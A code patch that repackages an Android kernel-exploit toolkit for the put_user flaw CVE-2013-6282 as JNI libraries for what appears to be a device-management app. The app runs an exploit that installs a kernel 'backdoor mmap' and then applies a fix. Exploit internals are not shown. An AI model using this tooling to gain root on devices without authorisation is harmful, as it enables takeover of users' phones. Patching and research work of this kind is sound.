@@ -1,0 +1,272 @@
+diff --git a/Android.mk b/Android.mk
+index be974b2..05ed32f 100644
+--- a/Android.mk
++++ b/Android.mk
+@@ -3,55 +3,6 @@ LOCAL_PATH := $(call my-dir)
+ include $(CLEAR_VARS)
+ 
+ LOCAL_SRC_FILES := \
+-  cred.c \
+-  kallsyms.c \
+-  main.c \
+-  ptmx.c \
+-  backdoor_mmap.c \
+-  mmap.c
+-
+-LOCAL_MODULE := run_root_shell
+-LOCAL_MODULE_TAGS := optional
+-LOCAL_STATIC_LIBRARIES += libdevice_database
+-LOCAL_STATIC_LIBRARIES += libcutils libc
+-LOCAL_LDFLAGS += -static
+-
+-include $(BUILD_EXECUTABLE)
+-
+-include $(CLEAR_VARS)
+-
+-LOCAL_SRC_FILES := \
+-  kallsyms.c \
+-  reset_security_ops.c \
+-  ptmx.c \
+-  backdoor_mmap.c
+-
+-LOCAL_MODULE := reset_security_ops
+-LOCAL_MODULE_TAGS := optional
+-LOCAL_STATIC_LIBRARIES += libdevice_database
+-LOCAL_STATIC_LIBRARIES += libcutils libc
+-LOCAL_LDFLAGS += -static
+-
+-include $(BUILD_EXECUTABLE)
+-
+-include $(CLEAR_VARS)
+-
+-LOCAL_SRC_FILES := \
+-  disable_ccsecurity.c \
+-  backdoor_mmap.c
+-
+-LOCAL_MODULE := disable_ccsecurity
+-LOCAL_MODULE_TAGS := optional
+-LOCAL_STATIC_LIBRARIES += libkallsyms
+-LOCAL_STATIC_LIBRARIES += libdevice_database
+-LOCAL_STATIC_LIBRARIES += libcutils libc
+-LOCAL_LDFLAGS += -static
+-
+-include $(BUILD_EXECUTABLE)
+-
+-include $(CLEAR_VARS)
+-
+-LOCAL_SRC_FILES := \
+   fix_cve_2013_6282.c \
+   kallsyms.c \
+   ptmx.c \
+@@ -62,9 +13,10 @@ LOCAL_MODULE_TAGS := optional
+ LOCAL_STATIC_LIBRARIES += libkallsyms
+ LOCAL_STATIC_LIBRARIES += libdevice_database
+ LOCAL_STATIC_LIBRARIES += libcutils libc
+-LOCAL_LDFLAGS += -static
++#LOCAL_LDFLAGS += -static
++LOCAL_LDLIBS += -llog
+ 
+-include $(BUILD_EXECUTABLE)
++include $(BUILD_SHARED_LIBRARY)
+ 
+ include $(CLEAR_VARS)
+ 
+@@ -88,12 +40,13 @@ LOCAL_STATIC_LIBRARIES += libput_user_exploit
+ LOCAL_STATIC_LIBRARIES += libfb_mem_exploit
+ LOCAL_STATIC_LIBRARIES += libz_static
+ LOCAL_STATIC_LIBRARIES += libcutils libc
+-LOCAL_LDFLAGS += -static
++#LOCAL_LDFLAGS += -static
++LOCAL_LDLIBS += -llog
+ 
+ TOP_SRCDIR := $(abspath $(LOCAL_PATH))
+ TARGET_C_INCLUDES += \
+   $(TOP_SRCDIR)/device_database
+ 
+-include $(BUILD_EXECUTABLE)
++include $(BUILD_SHARED_LIBRARY)
+ 
+ include $(call all-makefiles-under,$(LOCAL_PATH))
+diff --git a/expat.h b/expat.h
+new file mode 100644
+index 0000000..72701ad
+--- /dev/null
++++ b/expat.h
+@@ -0,0 +1,7 @@
++// defines which exploit/patch number the JNI interface should call
++// should be incremented for each new CVE
++#define EXPAT_NUM 1
++
++#define STR_HELPER(x) #x
++#define STR(x) STR_HELPER(x)
++#define __EXPAT_NUM__ STR(EXPAT_NUM)
+diff --git a/fix_cve_2013_6282.c b/fix_cve_2013_6282.c
+index 3ad04d3..f3ed881 100644
+--- a/fix_cve_2013_6282.c
++++ b/fix_cve_2013_6282.c
+@@ -10,6 +10,8 @@
+ #include <unistd.h>
+ #include <sys/stat.h>
+ #include <fcntl.h>
++#include <jni.h>
++#include <android/log.h>
+ 
+ #include "device_database/device_database.h"
+ #include "libkallsyms/kallsyms_in_memory.h"
+@@ -536,7 +538,7 @@ main(int argc, char **argv)
+     printf("Failed to mmap due to %s.\n", strerror(errno));
+     printf("Run 'install_backdoor' first\n");
+ 
+-    exit(EXIT_FAILURE);
++    return (EXIT_FAILURE);
+   }
+ 
+   if (!setup_variables()) {
+@@ -557,12 +559,50 @@ main(int argc, char **argv)
+   backdoor_close_mmap();
+ 
+   printf("Fixed CVE-2013-6282 vulnerability\n");
+-  exit(EXIT_SUCCESS);
++  return (EXIT_SUCCESS);
+ 
+ exit_failure:
+   backdoor_close_mmap();
+-  exit(EXIT_FAILURE);
++  return (EXIT_FAILURE);
+ }
++
++#include "expat.h"
++
++jint patPutUser(JNIEnv *env, jobject obj)
++{
++	jint ret = main(1, NULL);
++	__android_log_print(ANDROID_LOG_INFO, "expat", "JNI: Applying put_user patch: %d", ret);
++	return ret;
++}
++
++static JNINativeMethod methods[] =
++{
++	{"nativePat" __EXPAT_NUM__, "()I", (void *)&patPutUser}
++};
++
++JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM *vm, void *reserved)
++{
++	jclass classj;
++	JNIEnv *env = NULL;
++	char * className = "com/os3/expatmdm/JNI";
++
++	if ((*vm)->GetEnv(vm, (void**)&env, JNI_VERSION_1_2) != JNI_OK)
++		return -3;
++
++	classj = (*env)->FindClass(env, className);
++	if (classj == NULL) {
++		__android_log_print(ANDROID_LOG_ERROR, "expat", "JNI: Couldn't find base class.");
++		return -2;
++	}
++
++	if ((*env)->RegisterNatives(env, classj, methods, sizeof(methods)/sizeof(methods[0])) < 0) {
++		__android_log_print(ANDROID_LOG_ERROR, "expat", "JNI: Couldn't hook native methods.");
++		return -1;
++	}
++
++	return JNI_VERSION_1_2;
++}
++
+ /*
+ vi:ts=2:nowrap:ai:expandtab:sw=2
+ */
+diff --git a/install_backdoor.c b/install_backdoor.c
+index 2dc9cab..69fb917 100644
+--- a/install_backdoor.c
++++ b/install_backdoor.c
+@@ -6,6 +6,8 @@
+ #include <fcntl.h>
+ #define _LARGEFILE64_SOURCE
+ #include <zlib.h>
++#include <jni.h>
++#include <android/log.h>
+ 
+ #include "device_database/device_database.h"
+ #include "ptmx.h"
+@@ -449,36 +451,74 @@ main(int argc, char **argv)
+     if (backdoor_open_mmap()) {
+       remove_backdoor_mmap();
+       backdoor_close_mmap();
+-      exit(EXIT_SUCCESS);
++      return (EXIT_SUCCESS);
+     }
+     else {
+       printf("You have not installed backdoor mmap yet.\n");
+-      exit(EXIT_FAILURE);
++      return (EXIT_FAILURE);
+     }
+   }
+ 
+   if (backdoor_open_mmap()) {
+     backdoor_close_mmap();
+     printf("You have already installed backdoor mmap.\n");
+-    exit(EXIT_FAILURE);
++    return (EXIT_SUCCESS);
+   }
+ 
+   if (!setup_variables()) {
+-    exit(EXIT_FAILURE);
++    return (EXIT_FAILURE);
+   }
+ 
+   remap_pfn_range = get_remap_pfn_range_address();
+   if (!remap_pfn_range) {
+     printf("You need to manage to get remap_pfn_range addresses.\n");
+-    exit(EXIT_FAILURE);
++    return (EXIT_FAILURE);
+   }
+ 
+   if (!run_exploit()) {
+-    exit(EXIT_FAILURE);
++    return (EXIT_FAILURE);
+   }
+ 
+-  exit(EXIT_SUCCESS);
++  return (EXIT_SUCCESS);
+ }
++
++#include "expat.h"
++
++jint expPutUser(JNIEnv *env, jobject obj)
++{
++	jint ret = main(1, NULL);
++	__android_log_print(ANDROID_LOG_INFO, "expat", "JNI: Calling put_user exploit: %d", ret);
++	return ret;
++}
++
++static JNINativeMethod methods[] =
++{
++	{"nativeExp" __EXPAT_NUM__, "()I", (void *)&expPutUser}
++};
++
++JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM *vm, void *reserved)
++{
++	jclass classj;
++	JNIEnv *env = NULL;
++	char * className = "com/os3/expatmdm/JNI";
++
++	if ((*vm)->GetEnv(vm, (void**)&env, JNI_VERSION_1_2) != JNI_OK)
++		return -3;
++
++	classj = (*env)->FindClass(env, className);
++	if (classj == NULL) {
++		__android_log_print(ANDROID_LOG_ERROR, "expat", "JNI: Couldn't find base class.");
++		return -2;
++	}
++
++	if ((*env)->RegisterNatives(env, classj, methods, sizeof(methods)/sizeof(methods[0])) < 0) {
++		__android_log_print(ANDROID_LOG_ERROR, "expat", "JNI: Couldn't hook native methods.");
++		return -1;
++	}
++
++	return JNI_VERSION_1_2;
++}
++
+ /*
+ vi:ts=2:nowrap:ai:expandtab:sw=2
+ */
